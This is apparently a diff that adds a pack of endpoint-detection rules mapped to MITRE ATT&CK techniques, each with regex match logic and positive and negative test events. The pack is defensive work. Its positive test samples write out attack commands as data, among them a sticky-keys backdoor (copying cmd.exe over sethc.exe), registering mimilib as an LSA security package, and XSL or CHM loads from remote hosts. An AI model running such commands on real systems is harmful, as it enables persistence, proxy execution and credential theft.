@@ -1,0 +1,5768 @@
+{
+ "pack": "gap2",
+ "rules": [
+  {
+   "id": "gp2-win-hh-chm-remote",
+   "name": "hh.exe opens a remote or user-writable CHM",
+   "description": "HTML Help is pointed at a URL or a .chm in a temp, downloads or public folder, a compiled-HTML execution route.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.001",
+   "technique_name": "Compiled HTML File",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(hh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(https?://\\S+|\\\\(temp|downloads|appdata|users\\\\public)\\\\\\S*\\.chm)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "chm"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\hh.exe",
+      "command": "hh.exe https://203.0.113.5/help.chm"
+     },
+     {
+      "executable": "C:\\Windows\\hh.exe",
+      "command": "hh.exe C:\\Users\\a\\Downloads\\invoice.chm"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\hh.exe",
+      "command": "hh.exe C:\\Windows\\Help\\mui\\0409\\acppage.chm"
+     },
+     {
+      "executable": "C:\\Windows\\hh.exe",
+      "command": "hh.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-cmstp-inf-silent",
+   "name": "cmstp.exe installs an INF silently",
+   "description": "cmstp runs with /s (silent) and an INF file, often with /ns, the known profile-installer proxy-execution pattern.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.003",
+   "technique_name": "System Binary Proxy Execution: CMSTP",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(cmstp)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s[/-](s|ns|au)\\b"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       ".inf"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "cmstp"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmstp.exe",
+      "command": "cmstp.exe /s /ns C:\\Users\\a\\AppData\\Local\\Temp\\x.inf"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmstp.exe",
+      "command": "cmstp.exe /?"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cmstp.exe",
+      "command": "cmstp.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-odbcconf-regsvr",
+   "name": "odbcconf.exe loads a DLL through a response file or REGSVR",
+   "description": "odbcconf with /a {REGSVR dll} or a /f response file executes a DLL, a signed-binary proxy route.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218.008",
+   "technique_name": "System Binary Proxy Execution: Odbcconf",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(odbcconf)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/a\\s*\\{?\\s*(regsvr|configdsn)|[/-]f\\s+\\S+\\.rsp)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "odbcconf"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\odbcconf.exe",
+      "command": "odbcconf.exe /a {REGSVR C:\\Users\\Public\\x.dll}"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\odbcconf.exe",
+      "command": "odbcconf -f C:\\temp\\r.rsp"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\odbcconf.exe",
+      "command": "odbcconf.exe /?"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\odbcconf.exe",
+      "command": "odbcconf.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-xsl-script-processing",
+   "name": "XSL script processed by wmic or msxsl from a remote or user path",
+   "description": "wmic /format or msxsl loads an XSL stylesheet from a URL or user-writable path, which can embed script.",
+   "tactic": "Defense Evasion",
+   "technique": "T1220",
+   "technique_name": "XSL Script Processing",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(wmic)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "/format:\\s*\\\"?(https?://|[^ ]*\\\\(temp|users\\\\public|appdata|downloads)\\\\)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(msxsl)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(https?://|\\\\(temp|users\\\\public|appdata|downloads)\\\\)"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "xsl"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "command": "wmic os get /format:https://203.0.113.7/p.xsl"
+     },
+     {
+      "executable": "C:\\Users\\a\\msxsl.exe",
+      "command": "msxsl.exe C:\\Users\\a\\Downloads\\a.xml C:\\Users\\a\\Downloads\\s.xsl"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "command": "wmic os get caption /format:table"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "command": "wmic process list brief"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-office-remote-template",
+   "name": "Office application opens a remote template",
+   "description": "An Office program is launched with a URL to a .dot/.dotm/.dotx template, the remote template injection delivery pattern.",
+   "tactic": "Defense Evasion",
+   "technique": "T1221",
+   "technique_name": "Template Injection",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(winword|excel|powerpnt)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\S+\\.(dotm?|dotx|xltm?|xltx|potm?)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "office"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "command": "WINWORD.EXE /t https://203.0.113.9/t/evil.dotm"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "command": "WINWORD.EXE C:\\Users\\a\\Documents\\report.docx"
+     },
+     {
+      "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+      "command": "EXCEL.EXE /e"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-netsh-add-helper",
+   "name": "netsh add helper registers a helper DLL",
+   "description": "netsh add helper installs a DLL that netsh loads on every start, persistence through helper DLLs.",
+   "tactic": "Persistence",
+   "technique": "T1546.007",
+   "technique_name": "Event Triggered Execution: Netsh Helper DLL",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(netsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\badd\\s+helper\\s+\\S+\\.dll"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "netsh"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\netsh.exe",
+      "command": "netsh add helper C:\\Users\\Public\\h.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\netsh.exe",
+      "command": "netsh advfirewall show allprofiles"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\netsh.exe",
+      "command": "netsh interface ip show config"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-netsh-helper-registry",
+   "name": "NetSh helper key value set",
+   "description": "A value is written under HKLM\\Software\\Microsoft\\NetSh, which lists helper DLLs netsh loads.",
+   "tactic": "Persistence",
+   "technique": "T1546.007",
+   "technique_name": "Event Triggered Execution: Netsh Helper DLL",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\software\\\\microsoft\\\\netsh$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     },
+     {
+      "field": "value_data",
+      "op": "regex",
+      "pattern": "\\.dll$"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "netsh"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\NetSh",
+       "value_name": "bad",
+       "value_data": "C:\\Users\\Public\\h.dll",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\NetSh",
+       "value_name": "x",
+       "value_data": "not a library",
+       "operation": "set"
+      }
+     },
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+       "value_name": "x",
+       "value_data": "h.dll",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-accessibility-ifeo-debugger",
+   "name": "Accessibility binary gets an IFEO debugger",
+   "description": "A Debugger value is set under Image File Execution Options for sethc, utilman, osk, narrator, magnify or displayswitch, the sticky-keys backdoor.",
+   "tactic": "Persistence",
+   "technique": "T1546.008",
+   "technique_name": "Event Triggered Execution: Accessibility Features",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "image file execution options\\\\(sethc|utilman|osk|narrator|magnify|displayswitch|atbroker)\\.exe$"
+     },
+     {
+      "field": "value_name",
+      "op": "in",
+      "patterns": [
+       "debugger"
+      ]
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "sticky-keys"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
+       "value_name": "Debugger",
+       "value_data": "C:\\Windows\\System32\\cmd.exe",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\myapp.exe",
+       "value_name": "Debugger",
+       "value_data": "C:\\dbg\\windbg.exe",
+       "operation": "set"
+      }
+     },
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
+       "value_name": "Other",
+       "value_data": "x",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-accessibility-binary-replaced",
+   "name": "Accessibility binary overwritten with a shell",
+   "description": "A copy or takeown/icacls command targets sethc, utilman, osk or narrator in System32, the file-replacement variant of the sticky-keys backdoor.",
+   "tactic": "Persistence",
+   "technique": "T1546.008",
+   "technique_name": "Event Triggered Execution: Accessibility Features",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(cmd|powershell|pwsh|takeown|icacls|robocopy|xcopy)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(copy|move|takeown|icacls|xcopy|robocopy)\\b.*\\\\system32\\\\(sethc|utilman|osk|narrator|magnify)\\.exe"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "sticky-keys"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c copy a.txt b.txt"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd.exe /c dir C:\\Windows\\System32\\notepad.exe"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-appcert-reg-add",
+   "name": "reg.exe writes AppCertDLLs",
+   "description": "reg add targets the Session Manager AppCertDLLs key, which loads a DLL into every process using CreateProcess.",
+   "tactic": "Persistence",
+   "technique": "T1546.009",
+   "technique_name": "Event Triggered Execution: AppCert DLLs",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(reg|powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "appcertdlls"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "appcert"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs /v x /d C:\\Users\\Public\\a.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKCU\\Software\\Test /v a /d b"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-mac-emond-rule-created",
+   "name": "emond rule file created",
+   "description": "A plist is created under /etc/emond.d/rules or /private/var/db/emondClients; emond runs actions from these on system events.",
+   "tactic": "Persistence",
+   "technique": "T1546.014",
+   "technique_name": "Event Triggered Execution: Emond",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^(/private)?/etc/emond\\.d/rules/[^/]+\\.plist$|^/private/var/db/emondclients/"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "emond"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/emond.d/rules/evil.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/hosts",
+      "operation": "modify"
+     },
+     {
+      "path": "/Library/LaunchDaemons/com.vendor.plist",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-com-inproc-user-path",
+   "name": "COM InprocServer32 set to a user-writable DLL",
+   "description": "A CLSID InprocServer32 or LocalServer32 default value points into a user-writable directory, the COM hijacking persistence pattern.",
+   "tactic": "Persistence",
+   "technique": "T1546.015",
+   "technique_name": "Event Triggered Execution: Component Object Model Hijacking",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\classes\\\\clsid\\\\\\{[0-9a-f-]+\\}\\\\(inprocserver32|localserver32)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     },
+     {
+      "field": "value_data",
+      "op": "regex",
+      "pattern": "\\\\(appdata|temp|users\\\\public|programdata|downloads)\\\\"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "com"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Classes\\CLSID\\{11111111-2222-3333-4444-555555555555}\\InprocServer32",
+       "value_name": "",
+       "value_data": "C:\\Users\\a\\AppData\\Local\\Temp\\p.dll",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Classes\\CLSID\\{11111111-2222-3333-4444-555555555555}\\InprocServer32",
+       "value_name": "",
+       "value_data": "C:\\Windows\\System32\\ole32.dll",
+       "operation": "set"
+      }
+     },
+     {
+      "attrs": {
+       "key": "HKCU\\Software\\Classes\\CLSID\\{11111111-2222-3333-4444-555555555555}\\ProgID",
+       "value_name": "",
+       "value_data": "x",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-ssp-lsa-reg-add",
+   "name": "reg.exe edits LSA Security Packages",
+   "description": "reg add of Security Packages or Authentication Packages under Control\\Lsa registers a DLL the LSA loads, a credential-theft persistence route.",
+   "tactic": "Persistence",
+   "technique": "T1547.005",
+   "technique_name": "Boot or Logon Autostart Execution: Security Support Provider",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(reg|powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "control\\\\lsa.*(security|authentication|notification) packages|(security|authentication|notification) packages.*control\\\\lsa"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(add|set-itemproperty|new-itemproperty)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "ssp"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Security Packages /d mimilib /t REG_MULTI_SZ"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKCU\\Software\\X /v a"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-ssp-mimilib-module",
+   "name": "mimilib or known SSP DLL loaded",
+   "description": "A module named mimilib.dll or mimikatz-related SSP loaded by a process; mimilib is the Mimikatz SSP.",
+   "tactic": "Persistence",
+   "technique": "T1547.005",
+   "technique_name": "Boot or Logon Autostart Execution: Security Support Provider",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "module",
+   "match": {
+    "field": "module_path",
+    "op": "regex",
+    "pattern": "\\\\(mimilib|mimidrv|mimikatz)\\.dll$"
+   },
+   "tags": [
+    "gap2",
+    "ssp"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "C:\\Windows\\System32\\mimilib.dll",
+       "signed": "false",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "C:\\Windows\\System32\\kernel32.dll",
+       "signed": "true",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     },
+     {
+      "attrs": {
+       "module_path": "C:\\Windows\\System32\\kerberos.dll",
+       "signed": "true",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-startup-folder-lnk",
+   "name": "Shortcut or script created in a Startup folder",
+   "description": "A .lnk or .url shortcut is created in a user or all-users Startup folder, which runs it at logon. Installers do this too, so informational.",
+   "tactic": "Persistence",
+   "technique": "T1547.009",
+   "technique_name": "Shortcut Modification",
+   "severity": "low",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\start menu\\\\programs\\\\startup\\\\[^\\\\]+\\.(lnk|url)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "startup"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini",
+      "operation": "create"
+     },
+     {
+      "path": "C:\\Users\\a\\Desktop\\update.lnk",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-print-processor-reg",
+   "name": "Print processor registered",
+   "description": "A value is set under a Print Processors key, which loads a DLL into the spooler service.",
+   "tactic": "Persistence",
+   "technique": "T1547.012",
+   "technique_name": "Boot or Logon Autostart Execution: Print Processors",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\control\\\\print\\\\environments\\\\[^\\\\]+\\\\print processors\\\\"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     },
+     {
+      "field": "value_data",
+      "op": "regex",
+      "pattern": "\\.dll$"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "spooler"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\evil",
+       "value_name": "Driver",
+       "value_data": "evil.dll",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Drivers\\x",
+       "value_name": "Driver",
+       "value_data": "x.dll",
+       "operation": "set"
+      }
+     },
+     {
+      "attrs": {
+       "key": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\winprint",
+       "value_name": "Other",
+       "value_data": "x",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-mac-loginhook-set",
+   "name": "macOS login or logout hook set",
+   "description": "defaults write com.apple.loginwindow LoginHook or LogoutHook registers a script run as root at login.",
+   "tactic": "Persistence",
+   "technique": "T1037.002",
+   "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Mac)",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(defaults)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "write\\s+\\S*com\\.apple\\.loginwindow\\s+(login|logout)hook"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "loginhook"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write com.apple.loginwindow LoginHook /tmp/x.sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults read com.apple.loginwindow"
+     },
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write com.apple.dock autohide -bool true"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-mac-startupitems-created",
+   "name": "StartupItems entry created",
+   "description": "A file is created under /Library/StartupItems, a legacy macOS autostart location that is rarely used today.",
+   "tactic": "Persistence",
+   "technique": "T1037.005",
+   "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/library/startupitems/.+"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "startupitems"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/StartupItems/Evil/StartupParameters.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/Preferences/com.apple.x.plist",
+      "operation": "modify"
+     },
+     {
+      "path": "/Library/LaunchAgents/a.plist",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-at-job-scheduled",
+   "name": "at job scheduled",
+   "description": "The at command schedules a one-shot job (now, a clock time, noon or midnight). Routine for admins, so informational.",
+   "tactic": "Persistence",
+   "technique": "T1053.002",
+   "technique_name": "Scheduled Task/Job: At",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(at)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "^\\S*\\bat(\\.exe)?\\s+(now\\b|\\d{1,2}:\\d{2}|noon|midnight|teatime|\\+)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "at"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/at",
+      "command": "at now + 1 minute"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\at.exe",
+      "command": "at.exe 23:00 cmd /c evil.bat"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/at",
+      "command": "at -l"
+     },
+     {
+      "executable": "/usr/bin/atq",
+      "command": "atq"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-systemd-timer-user-created",
+   "name": "systemd timer unit created",
+   "description": "A .timer unit is created in /etc/systemd/system or a user systemd directory. Packages and admins do this, so informational.",
+   "tactic": "Persistence",
+   "technique": "T1053.006",
+   "technique_name": "Scheduled Task/Job: Systemd Timers",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^(/etc/systemd/system/|/home/[^/]+/\\.config/systemd/user/|/root/\\.config/systemd/user/)[^/]+\\.timer$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "systemd"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/home/a/.config/systemd/user/updater.timer",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/systemd/system/updater.service",
+      "operation": "create"
+     },
+     {
+      "path": "/usr/lib/systemd/system/fstrim.timer",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-k8s-cronjob-or-job-created",
+   "name": "kubectl creates a CronJob or Job",
+   "description": "kubectl create cronjob or job creates a scheduled workload; admins and CI do it too.",
+   "tactic": "Persistence",
+   "technique": "T1053.007",
+   "technique_name": "Scheduled Task/Job: Container Orchestration Job",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(kubectl|oc)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bcreate\\s+(cronjob|job)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "k8s"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl create cronjob beat --image=alpine --schedule='*/5 * * * *' -- sh -c id"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl get cronjobs"
+     },
+     {
+      "executable": "/usr/local/bin/kubectl",
+      "command": "kubectl create deployment web --image=nginx"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-mac-osascript-hidden-prompt",
+   "name": "osascript password prompt with hidden answer",
+   "description": "osascript display dialog with hidden answer and a password-like prompt, a GUI credential-harvesting pattern.",
+   "tactic": "Collection",
+   "technique": "T1056.002",
+   "technique_name": "Input Capture: GUI Input Capture",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(osascript)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "display dialog"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "contains",
+      "patterns": [
+       "hidden answer"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(password|passphrase|credential|keychain|apple id|sign in)"
+     }
+    ]
+   },
